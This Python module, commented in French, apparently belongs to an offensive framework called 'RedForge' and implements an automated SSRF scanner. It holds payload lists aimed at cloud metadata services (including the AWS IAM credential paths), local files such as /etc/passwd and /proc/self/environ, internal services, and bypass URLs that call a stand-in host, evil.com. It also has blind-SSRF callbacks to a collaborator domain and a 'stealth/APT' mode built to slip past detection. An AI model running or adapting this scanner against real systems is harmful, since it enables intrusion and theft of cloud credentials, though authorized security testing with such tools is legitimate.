#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de détection SSRF pour RedForge
Détecte les vulnérabilités de Server-Side Request Forgery
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

from src.core.stealth_engine import StealthEngine


class SSRFScanner:
    """Scanner avancé de vulnérabilités SSRF avec support furtif"""
    
    def __init__(self):
        # Payloads SSRF
        self.ssrf_payloads = {
            "Localhost": [
                "http://127.0.0.1",
                "http://localhost",
                "http://0.0.0.0",
                "http://[::1]",
                "http://127.0.0.1:80",
                "http://127.0.0.1:443",
                "http://127.0.0.1:8080",
                "http://localhost:8080",
                # IPv6
                "http://[::1]:80",
                "http://[::ffff:127.0.0.1]",
                # Variations
                "https://127.0.0.1",
                "http://127.0.0.1:22",
                "http://127.0.0.1:25"
            ],
            "Internal IPs": [
                "http://10.0.0.1",
                "http://172.16.0.1",
                "http://192.168.1.1",
                "http://169.254.169.254",  # AWS metadata
                "http://metadata.google.internal",  # GCP metadata
                "http://100.100.100.200",  # Aliyun metadata
                "http://10.10.10.10",
                "http://172.31.0.1",
                "http://192.168.0.1",
                "http://10.0.0.0/8",
                "http://172.16.0.0/12"
            ],
            "Encoded": [
                "http://127.0.0.1@evil.com",
                "http://evil.com#127.0.0.1",
                "http://127.0.0.1.evil.com",
                "http://127.0.0.1%00.evil.com",
                "http://127.0.0.1%23evil.com",
                "http://127.0.0.1?evil.com",
                "http://127.0.0.1/evil.com",
                "http://localhost@evil.com",
                "http://0/",  # Shortcut for 0.0.0.0
                "http://0.0.0.0/",
                "http://127.0.0.1:65535/",
                "http://127.127.127.127",
                "http://127.0.0.1.any",
                "http://0x7f000001"
            ],
            "File": [
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
                "file:///etc/hosts",
                "file:///proc/self/environ",
                "file:///proc/version",
                "gopher://localhost:8080",
                "dict://localhost:11211",
                "ftp://127.0.0.1",
                "http://127.0.0.1:6379",  # Redis
                "http://127.0.0.1:9200",  # Elasticsearch
                "http://127.0.0.1:27017"  # MongoDB
            ],
            "Redirect": [
                "http://evil.com/redirect?url=http://127.0.0.1",
                "http://evil.com/redirect?url=file:///etc/passwd",
                "http://evil.com/redirect?url=http://169.254.169.254"
            ],
            "Blind": [
                "http://{collaborator}",
                "http://{collaborator}/test",
                "http://127.0.0.1@{collaborator}",
                "http://{collaborator}#127.0.0.1",
                "http://{collaborator}?param=value"
            ]
        }
        
        # Signatures de réponse pour la détection
        self.response_signatures = {
            "aws_metadata": [r"instance-id", r"local-ipv4", r"iam/security-credentials", r"ami-id"],
            "gcp_metadata": [r"project-id", r"instance/name", r"service-accounts", r"computeMetadata"],
            "azure_metadata": [r"compute/", r"azEnvironment", r"resourceId"],
            "passwd": [r"root:.*:0:0:", r"daemon:.*:1:1:", r"bin:.*:2:2:"],
            "win_ini": [r"\[fonts\]", r"\[extensions\]", r"\[mci extensions\]"],
            "hosts": [r"127\.0\.0\.1\s+localhost", r"::1\s+localhost"],
            "env": [r"PATH=", r"HOME=", r"USER="],
            "error": [r"failed to open stream", r"file_get_contents", r"connection refused", r"Connection refused"]
        }
        
        # Moteur de furtivité
        self.stealth_engine = StealthEngine()
        self.stealth_mode = False
        self.apt_mode = False
    
    def set_stealth_config(self, config: Dict[str, Any]):
        """
        Configure le mode furtif
        
        Args:
            config: Configuration de furtivité
        """
        self.stealth_mode = config.get('enabled', False)
        self.apt_mode = config.get('apt_mode', False)
        
        if self.stealth_mode:
            self.stealth_engine.set_delays(
                min_delay=config.get('delay_min', 1),
                max_delay=config.get('delay_max', 5),
                jitter=config.get('jitter', 0.3)
            )
            if self.apt_mode:
                self.stealth_engine.enable_apt_mode()
    
    def _apply_stealth_delay(self):
        """Applique un délai furtif"""
        if self.stealth_mode:
            self.stealth_engine.apply_delay()
    
    def _get_headers(self) -> Dict[str, str]:
        """Génère des headers furtifs"""
        if self.stealth_mode:
            return self.stealth_engine.get_headers()
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités SSRF
        
        Args:
            target: URL cible
            **kwargs:
                - params: Paramètres spécifiques à tester
                - collaborator: Domaine collaborator pour blind SSRF
                - timeout: Timeout en secondes
                - depth: Profondeur de test
        """
        print(f"  → Scan des SSRF")
        if self.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        vulnerabilities = []
        tested_params = set()
        
        # Identifier les paramètres à tester
        params_to_test = self._get_params_to_test(target, kwargs)
        collaborator = kwargs.get('collaborator')
        
        # Limiter les payloads en mode APT
        payload_categories = list(self.ssrf_payloads.keys())
        if self.apt_mode:
            payload_categories = ['Localhost', 'Blind'] if collaborator else ['Localhost']
        
        for param in params_to_test:
            if param in tested_params:
                continue
            tested_params.add(param)
            
            for category in payload_categories:
                payloads = self.ssrf_payloads.get(category, [])
                # Limiter le nombre de payloads en mode APT
                if self.apt_mode:
                    payloads = payloads[:10]
                
                for payload in payloads:
                    self._apply_stealth_delay()
                    
                    # Remplacer collaborator si présent
                    test_payload = payload
                    if collaborator and '{collaborator}' in payload:
                        test_payload = payload.replace('{collaborator}', collaborator)
                    
                    result = self._test_ssrf(target, param, test_payload, collaborator is not None)
                    
                    if result['vulnerable']:
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": test_payload[:80] + "..." if len(test_payload) > 80 else test_payload,
                            "category": category,
                            "severity": "HIGH",
                            "evidence": result['evidence'],
                            "internal_service": result.get('service', 'unknown'),
                            "risk_score": 85 if category == 'File' else 80,
                            "response_time": result.get('response_time', 0)
                        })
                        print(f"      ✓ SSRF trouvée: {param} -> {test_payload[:40]}...")
                        break
                else:
                    continue
                break
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "stealth_mode": self.stealth_mode,
            "apt_mode": self.apt_mode,
            "summary": self._generate_summary(vulnerabilities)
        }
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params:
            params = self._extract_params(target)
        
        # Limiter en mode APT
        if self.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres potentiels pour SSRF"""
        ssrf_params = [
            'url', 'uri', 'path', 'dest', 'destination', 'redirect', 'return',
            'next', 'forward', 'go', 'out', 'view', 'dir', 'show', 'file',
            'load', 'read', 'document', 'folder', 'root', 'path', 'location',
            'src', 'source', 'img', 'image', 'avatar', 'profile', 'photo',
            'download', 'fetch', 'request', 'api', 'webhook', 'callback',
            'href', 'link', 'action', 'submit', 'post', 'get', 'proxy'
        ]
        
        parsed = urlparse(target)
        if parsed.query:
            existing_params = parse_qs(parsed.query).keys()
            for param in existing_params:
                if param.lower() in ssrf_params:
                    return [param]
        
        return ssrf_params
    
    def _test_ssrf(self, target: str, param: str, payload: str, 
                   blind: bool = False) -> Dict[str, Any]:
        """Teste un payload SSRF"""
        result = {
            'vulnerable': False,
            'evidence': '',
            'service': None,
            'response_time': 0
        }
        
        # Construire l'URL avec payload
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        if param in query_params:
            query_params[param] = [payload]
        else:
            query_params[param] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            headers = self._get_headers()
            start_time = time.time()
            response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            elapsed_time = time.time() - start_time
            result['response_time'] = elapsed_time
            
            # Vérifier les signatures
            for sig_type, patterns in self.response_signatures.items():
                for pattern in patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        result['vulnerable'] = True
                        result['evidence'] = pattern
                        result['service'] = sig_type
                        return result
            
            # Vérifier les erreurs
            error_indicators = [
                'failed to open stream',
                'file_get_contents',
                'connection refused',
                'Connection refused',
                'Unable to connect',
                'could not resolve host'
            ]
            
            for error in error_indicators:
                if error.lower() in response.text.lower():
                    result['vulnerable'] = True
                    result['evidence'] = error
                    return result
            
            # Time-based detection
            if elapsed_time > 2 and any(x in payload for x in ['localhost', '127.0.0.1', 'internal']):
                result['vulnerable'] = True
                result['evidence'] = f'time_based_delay:{elapsed_time:.2f}s'
                return result
                
        except requests.Timeout:
            result['vulnerable'] = True
            result['evidence'] = 'timeout'
            return result
        except requests.ConnectionError:
            pass
        except Exception:
            pass
        
        return result
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune SSRF détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_category": {
                "localhost": len([v for v in vulnerabilities if v['category'] == 'Localhost']),
                "internal": len([v for v in vulnerabilities if v['category'] == 'Internal IPs']),
                "file": len([v for v in vulnerabilities if v['category'] == 'File']),
                "encoded": len([v for v in vulnerabilities if v['category'] == 'Encoded']),
                "blind": len([v for v in vulnerabilities if v['category'] == 'Blind'])
            },
            "services": {
                "aws_metadata": len([v for v in vulnerabilities if v.get('service') == 'aws_metadata']),
                "gcp_metadata": len([v for v in vulnerabilities if v.get('service') == 'gcp_metadata']),
                "azure_metadata": len([v for v in vulnerabilities if v.get('service') == 'azure_metadata'])
            },
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def test_aws_metadata(self, target: str, param: str) -> Dict[str, Any]:
        """
        Teste spécifiquement l'accès au metadata AWS
        
        Args:
            target: URL cible
            param: Paramètre à tester
        """
        aws_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://169.254.169.254/latest/meta-data/public-keys/"
        ]
        
        results = []
        for aws_url in aws_urls:
            self._apply_stealth_delay()
            result = self._test_ssrf(target, param, aws_url, False)
            if result['vulnerable']:
                results.append({
                    "url": aws_url,
                    "evidence": result['evidence']
                })
        
        return {
            "parameter": param,
            "vulnerable": len(results) > 0,
            "accessible_endpoints": results
        }
    
    def test_gcp_metadata(self, target: str, param: str) -> Dict[str, Any]:
        """
        Teste spécifiquement l'accès au metadata GCP
        
        Args:
            target: URL cible
            param: Paramètre à tester
        """
        gcp_urls = [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname"
        ]
        
        headers = {'Metadata-Flavor': 'Google'}
        results = []
        
        for gcp_url in gcp_urls:
            self._apply_stealth_delay()
            result = self._test_ssrf(target, param, gcp_url, False)
            if result['vulnerable']:
                results.append({
                    "url": gcp_url,
                    "evidence": result['evidence']
                })
        
        return {
            "parameter": param,
            "vulnerable": len(results) > 0,
            "accessible_endpoints": results
        }
    
    def blind_ssrf(self, target: str, collaborator: str) -> Dict[str, Any]:
        """
        Teste les SSRF blind via DNS exfiltration
        
        Args:
            target: URL cible
            collaborator: Domaine collaborator
        """
        blind_payloads = [
            f"http://{collaborator}",
            f"http://{collaborator}/test",
            f"http://127.0.0.1@{collaborator}",
            f"http://{collaborator}#127.0.0.1",
            f"http://{collaborator}?param=value",
            f"http://{collaborator}:8080",
            f"https://{collaborator}"
        ]
        
        results = []
        params = self._extract_params(target)
        
        for param in params:
            for payload in blind_payloads:
                self._apply_stealth_delay()
                result = self._test_ssrf(target, param, payload, True)
                if result['vulnerable']:
                    results.append({
                        "parameter": param,
                        "payload": payload,
                        "type": "blind_ssrf",
                        "collaborator": collaborator
                    })
                    print(f"      ✓ Blind SSRF possible: {param} -> {payload[:40]}...")
                    break
        
        return {
            "vulnerabilities": results,
            "count": len(results)
        }
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques du scanner"""
        return {
            "stealth_mode": self.stealth_mode,
            "apt_mode": self.apt_mode,
            "payloads_count": sum(len(p) for p in self.ssrf_payloads.values())
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    print("=" * 60)
    print("Test de SSRFScanner")
    print("=" * 60)
    
    scanner = SSRFScanner()
    
    # Configuration mode APT
    scanner.set_stealth_config({
        'enabled': True,
        'apt_mode': True,
        'delay_min': 2,
        'delay_max': 5
    })
    
    # Test (simulé)
    # results = scanner.scan("https://example.com/fetch?url=test")
    # print(f"SSRF trouvées: {results['count']}")
    
    print("\n✅ Module SSRFScanner chargé avec succès")